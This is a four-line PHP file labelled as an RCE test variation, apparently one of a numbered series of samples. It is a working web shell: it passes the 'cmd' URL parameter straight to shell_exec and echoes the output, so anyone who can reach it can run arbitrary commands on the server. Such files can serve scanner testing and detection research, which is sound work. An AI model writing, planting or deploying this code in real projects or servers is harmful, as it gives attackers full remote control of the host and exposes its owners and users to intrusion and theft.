<?php
// RCE test variation #1233
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>